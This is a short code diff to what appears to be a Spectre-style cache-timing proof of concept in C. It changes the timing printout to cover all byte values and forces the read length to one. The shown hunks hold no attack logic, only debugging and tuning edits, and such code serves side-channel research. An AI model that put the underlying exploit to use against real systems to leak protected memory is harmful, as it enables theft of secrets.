@@ -188,13 +188,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 	/* Print timing */
 	for (i = 0; i < 256; i++)
 	{
-		if (results[i] > 0)
-		{
-			timing[i] /= MAX_TRIES;
-			#ifdef DEBUG
-			printf("%d: %d (%f)\n", i, results[i], timing[i]);
-			#endif
-		}
+		timing[i] /= MAX_TRIES;
+		printf("\n%d: %f\n", i, timing[i]);
 	}
 
 	results[0] ^= junk; /* use junk so code above won't get optimized out*/
@@ -226,6 +221,7 @@ int main(int argc, char **argv)
 		sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);
 		sscanf(argv[3], "%d", &len);
 	}
+	len = 1;
 	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);
 
 	for (size_t i = 0; i < sizeof(array2); i++)
